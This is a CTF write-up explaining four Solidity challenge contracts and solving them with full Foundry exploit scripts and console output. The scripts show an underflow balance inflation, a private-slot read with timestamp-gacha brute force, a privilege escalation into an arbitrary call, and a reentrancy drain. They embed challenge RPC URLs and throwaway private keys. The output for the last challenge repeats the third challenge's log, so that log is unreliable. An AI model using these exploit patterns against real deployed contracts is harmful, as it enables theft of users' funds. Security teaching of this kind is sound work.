---
layout: post
title: "TCP1P CTF 2024 Blockchain Writeup"
categories: 
  - Writeup
  - Web3
author: Songhyun Bae
---

On October 14, 2024, I participated in the TCP1P CTF 2024 as part of the CyKor team and successfully solved 4 out of 6 blockchain challenges. You can find all the solution code at [this repo](https://github.com/bshyuunn/TCP1P-CTF-2024-Blockchain-Writeup?tab=readme-ov-file).

## **01. Baby ERC-20**

> New token standards huh? https://eips.ethereum.org/EIPS/eip-20
> 

In this challenge, there is an `HCOIN` contract that inherits from `Ownable`. The goal of this problem is to make the `_player` hold more than 1000 ether worth of `HCOIN`. The Setup contract is as follows:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import { HCOIN } from "./HCOIN.sol";

contract Setup {
    HCOIN public coin;
    address player;

    constructor() public payable {
        require(msg.value == 1 ether);
        coin = new HCOIN();
        coin.deposit{value: 1 ether}();
    }

    function setPlayer(address _player) public {
      require(_player == msg.sender, "Player must be the same with the sender");
      require(_player == tx.origin, "Player must be a valid Wallet/EOA");
      player = _player;
    }

    function isSolved() public view returns (bool) {
        return coin.balanceOf(player) > 1000 ether; // im rich :D
    }
}
```

An interesting point here is that the Solidity version being used is `0.6.12`, which is quite old. This version does not include built-in protections against overflow and underflow vulnerabilities. As expected, there is an underflow vulnerability in the `HCOIN::transfer()` function.

```solidity
function transfer(address _to, uint256 _value) public returns (bool success) {
	require(_to != address(0), "ERC20: transfer to the zero address");
	require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");
	balanceOf[msg.sender] -= _value;
	balanceOf[_to] += _value;
	emit Transfer(msg.sender, _to, _value);
	return true;
}
```
The transfer function checks if the sender has enough funds using the require statement. However, the line `balanceOf[msg.sender] - _value` can cause an underflow if `_value` is larger than `balanceOf[msg.sender]`. In such a case, the underflow allows the require statement to pass. The subsequent operation `balanceOf[msg.sender] -= _value` causes the sender’s balance to underflow, increasing their balance due to the underflow bug.

### Solution Script

To solve this challenge, we can set the player using the setPlayer function and transfer `1 wei` to an arbitrary address to exploit the underflow and increase the player’s balance, solving the challenge.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/BabyERC-20/Setup.sol";
import {HCOIN} from "../src/BabyERC-20/HCOIN.sol";

contract SolveBabyERC is Script {
    uint256 playerPrivateKey;
    address player;

    Setup setupInstance;
    HCOIN hcoinInstance;

    function setUp() external {
        string memory rpcUrl = "http://45.32.119.201:13391/36c6dd78-00c5-470c-956b-139ccff87824";
        playerPrivateKey = 0x2e95bce86940b659debae7e80857bf1e92eb2b1b8e5c6c9feaac00a93251fe43;
        address setUpContract = 0x78fb4bcF652b5130f77A64A3Ea5489bE18b58B89;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        setupInstance = Setup(setUpContract);
        hcoinInstance = HCOIN(setupInstance.coin());
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);
        setupInstance.setPlayer(player);

        console.log("Before Player Balance: ", hcoinInstance.balanceOf(player) / 10**18);

        hcoinInstance.transfer(vm.addr(1), 1);

        console.log("After Player Balance: ", hcoinInstance.balanceOf(player) / 10**18);
        console.log("isSolved: ", setupInstance.isSolved());

        vm.stopBroadcast();
    }
}
```
```
$ forge script SolveBabyERC
[⠊] Compiling...
[⠒] Compiling 23 files with Solc 0.6.12
[⠔] Compiling 6 files with Solc 0.8.27
[⠆] Solc 0.8.27 finished in 325.74ms
[⠔] Solc 0.6.12 finished in 1.12s
Script ran successfully.
Gas used: 119416

== Logs ==
  Before Player Balance:  0
  After Player Balance:  115792089237316195423570985008687907853269984665640564039457
  isSolved:  true
```
<br>
## **02. injus gambit**

> Inju owns all the things in the area, waiting for one worthy challenger to emerge. Rumor said, that there many ways from many different angle to tackle Inju. Are you the Challenger worthy to oppose him?
> 

In this challenge, the goal is to modify the challengeManager of the `Privileged` contract to `address(0)`. The Setup contract is as follows:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "./Privileged.sol";
import "./ChallengeManager.sol";

contract Setup {
    Privileged public privileged;
    ChallengeManager public challengeManager;
    Challenger1 public Chall1;
    Challenger2 public Chall2;

    constructor(bytes32 _key) payable{
        privileged = new Privileged{value: 100 ether}();
        challengeManager = new ChallengeManager(address(privileged), _key);
        privileged.setManager(address(challengeManager));

        // prepare the challenger
        Chall1 = new Challenger1{value: 5 ether}(address(challengeManager));
        Chall2 = new Challenger2{value: 5 ether}(address(challengeManager));
    }

    function isSolved() public view returns(bool){
        return address(privileged.challengeManager()) == address(0);
    }
}

contract Challenger1 {
    ChallengeManager public challengeManager;

    constructor(address _target) payable{
        require(msg.value == 5 ether);
        challengeManager = ChallengeManager(_target);
        challengeManager.approach{value: 5 ether}();

    }
}

contract Challenger2 {
    ChallengeManager public challengeManager;

    constructor(address _target) payable{
        require(msg.value == 5 ether);
        challengeManager = ChallengeManager(_target);
        challengeManager.approach{value: 5 ether}();
    }
}
```

In the `ChallengeManager::challengeCurrentOwner` function, the `challengeManager` value of the `Privileged` contract can be changed. However, you need to know the `masterKey` and obtain the `theChallenger` role to do so.

```solidity
bytes32 private masterKey;

modifier onlyChosenChallenger(){
    require(msg.sender == theChallenger, "Not Chosen One");
    _;
}

function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
    if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
        privileged.setNewCasinoOwner(address(theChallenger));
    }        
}
```

The `masterKey` is a private variable, but since it is stored in a storage slot, its value can be read by directly accessing the storage. The `masterKey` variable is found to be located in Slot 1.

```solidity
$ forge inspect ChallengeManager storage-layout --pretty
| Name                     | Type                     | Slot | Offset | Bytes | Contract                                  |
|--------------------------|--------------------------|------|--------|-------|-------------------------------------------|
| privileged               | contract Privileged      | 0    | 0      | 20    | src/ChallengeManager.sol:ChallengeManager |
| masterKey                | bytes32                  | 1    | 0      | 32    | src/ChallengeManager.sol:ChallengeManager |
| qualifiedChallengerFound | bool                     | 2    | 0      | 1     | src/ChallengeManager.sol:ChallengeManager |
| theChallenger            | address                  | 2    | 1      | 20    | src/ChallengeManager.sol:ChallengeManager |
| casinoOwner              | address                  | 3    | 0      | 20    | src/ChallengeManager.sol:ChallengeManager |
| challengingFee           | uint256                  | 4    | 0      | 32    | src/ChallengeManager.sol:ChallengeManager |
| challenger               | address[]                | 5    | 0      | 32    | src/ChallengeManager.sol:ChallengeManager |
| approached               | mapping(address => bool) | 6    | 0      | 32    | src/ChallengeManager.sol:ChallengeManager |
```

You can retrieve the `masterKey` value using the following script.

```solidity
$ cast storage <ChallengeManager Address> 0 --rpc-url http://45.32.119.201:44445/79b1e60c-b236-4f69-80ae-c519d16b03a2
0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559
```

To obtain the `theChallenger` role, you need to use the `upgradeChallengerAttribute` function. If you input the same `challengerId` for both `challengerId` and `strangerId`, where the Player is the `challenger`, and the gacha value is 0 or 1 four times consecutively, the `theChallenger` will be updated to the Player’s address.

```solidity
function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
    if (challengerId > privileged.challengerCounter()){
        revert CM_InvalidIdOfChallenger();
    }
    if(strangerId > privileged.challengerCounter()){
        revert CM_InvalidIdofStranger();
    }
    if(privileged.getRequirmenets(challengerId).challenger != msg.sender){
        revert CM_CanOnlyChangeSelf();
    }

    uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;

    if (gacha == 0){
        if(privileged.getRequirmenets(strangerId).isRich == false){
            privileged.upgradeAttribute(strangerId, true, false, false, false);
        }else if(privileged.getRequirmenets(strangerId).isImportant == false){
            privileged.upgradeAttribute(strangerId, true, true, false, false);
        }else if(privileged.getRequirmenets(strangerId).hasConnection == false){
            privileged.upgradeAttribute(strangerId, true, true, true, false);
        }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){
            privileged.upgradeAttribute(strangerId, true, true, true, true);
            qualifiedChallengerFound = true;
            theChallenger = privileged.getRequirmenets(strangerId).challenger;
        }
    }else if (gacha == 1){
        if(privileged.getRequirmenets(challengerId).isRich == false){
            privileged.upgradeAttribute(challengerId, true, false, false, false);
        }else if(privileged.getRequirmenets(challengerId).isImportant == false){
            privileged.upgradeAttribute(challengerId, true, true, false, false);
        }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
            privileged.upgradeAttribute(challengerId, true, true, true, false);
        }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
            privileged.upgradeAttribute(challengerId, true, true, true, true);
            qualifiedChallengerFound = true;
            theChallenger = privileged.getRequirmenets(challengerId).challenger;
        }
    }else if(gacha == 2){
        privileged.resetAttribute(challengerId);
        qualifiedChallengerFound = false;
        theChallenger = address(0);
    }else{
        privileged.resetAttribute(strangerId);
        qualifiedChallengerFound = false;
        theChallenger = address(0);
    }
}
```

Here, the `gacha` value is determined by `uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4`. Since the `block.timestamp` is a predictable value, it can be exploited to manipulate the outcome.

### Solution Script

```solidity
// SPDX-License-Identifier: MIT
// forge script SolveInjusGambit --broadcast --skip-simulation
pragma solidity ^0.8.26;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/InjusGambit/Setup.sol";
import {Privileged} from "../src/InjusGambit/Privileged.sol";
import {ChallengeManager} from "../src/InjusGambit/ChallengeManager.sol";

contract SolveInjusGambit is Script {
    uint256 playerPrivateKey;
    address player;

    Setup setupInstance;
    Privileged privilegedInstance;
    ChallengeManager challengemanagerInstance;

    function setUp() external {
        string memory rpcUrl = "http://45.32.119.201:44445/79b1e60c-b236-4f69-80ae-c519d16b03a2";
        playerPrivateKey = 0x35c336336e238f3535ad592e40e0bfc3d7768df1484192a7ebe2473d2f2c0a2c;
        address setUpContract = 0x123Fe56023E9267275AfFA0A93d32405d409e706;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        setupInstance = Setup(setUpContract);
        privilegedInstance = setupInstance.privileged();
        challengemanagerInstance = setupInstance.challengeManager();
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);
        console.log("Player Balance:", player.balance / 10**18);

        // uint slotIndex = 1;
        // bytes32 slotData = vm.load(address(challengemanagerInstance), bytes32(slotIndex));
        bytes32 slotData = 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559; // to broadcast
        console.logBytes32(slotData);

        AttackContract attackInstance = new AttackContract{value: 5 ether}(setupInstance, privilegedInstance, challengemanagerInstance, slotData);
        
        while (true) {
            payable(0x0).transfer(1); // change block.timestamp()
            vm.warp(block.timestamp + 1); // to test in local
            attackInstance.attack();

            if (address(privilegedInstance.challengeManager()) == address(0)) {
                break;
            }
        }

        console.log("isSolved: ", setupInstance.isSolved());

        vm.stopBroadcast();
    }
}

contract AttackContract is Script {
    Setup setupInstance;
    Privileged privilegedInstance;
    ChallengeManager challengemanagerInstance;
    bytes32 slotData;

    constructor(Setup _setupInstance, Privileged _privilegedInstance, ChallengeManager _challengemanagerInstance, bytes32 _slotData) payable {
        setupInstance = _setupInstance;
        privilegedInstance = _privilegedInstance;
        challengemanagerInstance = _challengemanagerInstance;
        slotData = _slotData;
    }

    function attack() public {
        if ((uint256(keccak256(abi.encodePacked(address(this), block.timestamp))) % 4) > 1) {
            return;
        }

        console.log("gacha: ", uint256(keccak256(abi.encodePacked(address(this), block.timestamp))) % 4);

        challengemanagerInstance.approach{value: 5 ether}();
        
        uint256 Id = privilegedInstance.challengerCounter() - 1;

        for (uint256 i = 0; i<4; i++) {
            challengemanagerInstance.upgradeChallengerAttribute(Id, Id);
        }

        privilegedInstance.getRequirmenets(Id);

        challengemanagerInstance.challengeCurrentOwner(slotData);

        privilegedInstance.fireManager();
    }

}
```
```
$ forge script SolveInjusGambit --broadcast --skip-simulation
[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.27
[⠔] Solc 0.8.27 finished in 1.51s
Compiler run successful!
Script ran successfully.
Gas used: 677996

== Logs ==
  Player Balance: 10
  0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559
  gacha:  0
  isSolved:  true
```
<br>
## **03. Executive Problem**

> If only we managed to climb high enough, maybe we can dethrone someone?
> 

The goal of this challenge is to sequentially elevate the Player’s privileges and modify the `crain` value in the `Crain` contract. The Setup contract is as follows:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Crain.sol";
import "./CrainExecutive.sol";

contract Setup{
    CrainExecutive public cexe;
    Crain public crain;

    constructor() payable{
        cexe = new CrainExecutive{value: 50 ether}();
        crain = new Crain(payable(address(cexe)));
    }

    function isSolved() public view returns(bool){
        return crain.crain() != address(this);
    }

}
```
<br>

The only function that can modify the crain value is `ascendToCrain`. This function can only be called from the `CrainExecutive` contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./CrainExecutive.sol";

contract Crain{
    CrainExecutive public ce;
    address public crain;

    modifier _onlyExecutives(){
        require(msg.sender == address(ce), "Only Executives can replace");
        _;
    }

    constructor(address payable _ce) {
        ce = CrainExecutive(_ce);
        crain = msg.sender;
    }

    function ascendToCrain(address _successor) public _onlyExecutives{
        crain = _successor;
    }

    receive() external payable { }
    
}
```

To call this function from the `CrainExecutive` contract, the `transfer` function must be used, and the `_message` argument can be utilized to perform a low-level function call. However, to invoke the `transfer` function, the `isExecutive` privilege must be obtained.

```solidity
modifier _onlyExecutive(){
    require(isExecutive[msg.sender] == true, "Only Higher Ups can access!");
    _;
}

function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{
    require(to != address(0), "Invalid Recipient");
    require(balanceOf[msg.sender] - _amount >= 0, "Not enough Credit");
    uint256 totalSent = _amount;
    balanceOf[msg.sender] -= totalSent;
    balanceOf[to] += totalSent;
    (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message));
    require(transfered, "Failed to Transfer Credit!");
}
```

To obtain the `isExecutive` privilege, you must first sequentially acquire the `isEmployee` and `isManager` privileges. Additionally, during this process, the `buyCredit` function must be used to increase the Player’s `balance`.

```solidity
function becomeEmployee() public {
    isEmployee[msg.sender] = true;
}

function becomeManager() public _onlyEmployee{
    require(balanceOf[msg.sender] >= 1 ether, "Must have at least 1 ether");
    require(isEmployee[msg.sender] == true, "Only Employee can be promoted");
    isManager[msg.sender] = true;
}

function becomeExecutive() public {
    require(isEmployee[msg.sender] == true && isManager[msg.sender] == true);
    require(balanceOf[msg.sender] >= 5 ether, "Must be that Rich to become an Executive");
    isExecutive[msg.sender] = true;
}

function buyCredit() public payable _onlyEmployee{
    require(msg.value >= 1 ether, "Minimum is 1 Ether");
    uint256 totalBought = msg.value;
    balanceOf[msg.sender] += totalBought;
    totalSupply += totalBought;
}
```

### Solution Script

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/ExecutiveProblem/Setup.sol";
import {CrainExecutive} from "../src/ExecutiveProblem/CrainExecutive.sol";
import {Crain} from "../src/ExecutiveProblem/Crain.sol";

contract SolveExecutiveProblem is Script {
    address owner;
    address player;
    uint256 playerPrivateKey;
    
    Setup setupInstance;
    Crain crainInstance;
    CrainExecutive crainexecutiveInstance;

    function setUp() external {
        string memory rpcUrl = "http://45.32.119.201:44455/20fbf554-1a0a-4ad6-a9f9-559fec431f87";
        playerPrivateKey = 0xbdf0189f8c30902fb42990f6826dd5abcb9fbb1783b8c9aac85254680c0c78fe;
        address setUpContract = 0xddf8F8Ed9aCA4B46632BfbeCb5733A066da40070;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        setupInstance = Setup(setUpContract);
        crainInstance = setupInstance.crain();
        crainexecutiveInstance = setupInstance.cexe();
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        crainexecutiveInstance.becomeEmployee();
        crainexecutiveInstance.buyCredit{value: 5 ether}();
        crainexecutiveInstance.becomeManager();
        crainexecutiveInstance.becomeExecutive();

        bytes memory message = abi.encodeCall(crainInstance.ascendToCrain, (address(0x0)));
        crainexecutiveInstance.transfer(address(crainInstance), 0, message);

        console.log("isSolved: ", setupInstance.isSolved());

        vm.stopBroadcast();
    }
}
```

```
$ forge script SolveExecutiveProblem
[⠊] Compiling...
[⠒] Compiling 19 files with Solc 0.8.27
[⠔] Solc 0.8.27 finished in 1.45s
Compiler run successful!
Script ran successfully.
Gas used: 160223

== Logs ==
  isSolved:  true
```
<br>
## **04. Unsolveable Money Captcha**

> Oh no! Hackerika just made a super-duper mysterious block chain thingy!
I'm not sure what she's up to, maybe creating a super cool bank app?
But guess what? It seems a bit wobbly because it's asking us to solve a super tricky captcha!
What a silly kid! Let's help her learn how to make a super-duper awesome contract with no head-scratching captcha! XD
> 

The goal of this challenge is to drain all the funds from the `moneyContract`. The Setup contract is as follows:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Money.sol";

contract Setup {
    Money public immutable moneyContract;
    Captcha public immutable captchaContract;
    constructor() payable {
        require(msg.value == 100 ether);
        captchaContract = new Captcha();
        moneyContract = new Money(captchaContract);
        moneyContract.save{value: 10 ether}();
    }
    function isSolved() public view returns (bool) {
        return address(moneyContract).balance == 0;
    }
}
```

In the `Money` Contract, funds can be deposited using the `save` function and withdrawn using the `load` function.

```solidity
function save() public payable {
    require(msg.value > 0, "You don't have money XP");
    balances[msg.sender] += msg.value;
}

function load(uint256 userProvidedCaptcha) public {
    uint balance = balances[msg.sender];
    require(balance > 0, "You don't have money to load XD");

    uint256 generatedCaptcha = captchaContract.generateCaptcha(secret);
    require(userProvidedCaptcha == generatedCaptcha, "Invalid captcha");

    (bool success,) = msg.sender.call{value: balance}("");
    require(success, 'Oh my god, what is that!?');
    balances[msg.sender] = 0;
}
```

The load function contains a reentrancy attack vulnerability because it updates `balances[msg.sender]` after transferring the funds.

```solidity
(bool success,) = msg.sender.call{value: balance}("");
require(success, 'Oh my god, what is that!?');
balances[msg.sender] = 0;
```

### Solution Script

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/UnsolveableMoneyCaptcha/Setup.sol";
import {Money} from "../src/UnsolveableMoneyCaptcha/Money.sol";
import {Captcha} from "../src/UnsolveableMoneyCaptcha/Captcha.sol";

contract SolveUnsolveableMoneyCaptcha is Script {
    address player;
    uint256 playerPrivateKey;
    
    Setup setupInstance;
    Money moneyInstance;
    Captcha captchaInstance;

    function setUp() external {
        string memory rpcUrl = "http://45.32.119.201:44555/515adbcd-67c0-4c9a-86a5-110d82b92283";
        playerPrivateKey = 0x35342fe50f9cb61e0596a086a7c2e1641a084135137c13456c5db0ec4e4d7adc;
        address setUpContract = 0xccB5d206beaB580F352020b782cff04A80568E77;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        setupInstance = Setup(setUpContract);
        captchaInstance = setupInstance.captchaContract();
        moneyInstance = setupInstance.moneyContract();
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        AttakContract attackcontractInstance = new AttakContract{value: 50 ether}(setupInstance, captchaInstance, moneyInstance);
        
        console.log("Before Player balance: ", moneyInstance.balances(player));
        attackcontractInstance.attack();

        console.log("After Player balance: ", moneyInstance.balances(player));
        console.log("isSolved: ", setupInstance.isSolved());

        vm.stopBroadcast();
    }
}

contract AttakContract {
    Setup setupInstance;
    Captcha captchaInstance;
    Money moneyInstance;

    uint256 secret;

    constructor(Setup _setupInstance, Captcha _captchaInstance, Money _moneyInstance) payable {
        setupInstance = _setupInstance;
        captchaInstance = _captchaInstance;
        moneyInstance = _moneyInstance;
    }

    function attack() public {
        moneyInstance.save{value: 10 ether}();

        secret = moneyInstance.secret();
        uint256 generatedCaptcha = captchaInstance.generateCaptcha(secret);
        moneyInstance.load(generatedCaptcha);
    }

    receive() external payable {
        if (address(moneyInstance).balance != 0) {
            uint256 generatedCaptcha = captchaInstance.generateCaptcha(secret);
            moneyInstance.load(generatedCaptcha);
        }
        
    }
}
```

```
$ forge script SolveExecutiveProblem
[⠊] Compiling...
[⠔] Compiling 19 files with Solc 0.8.26
[⠒] Solc 0.8.27 finished in 1.45s
Compiler run successful!
Script ran successfully.
Gas used: 160223

== Logs ==
  isSolved:  true
```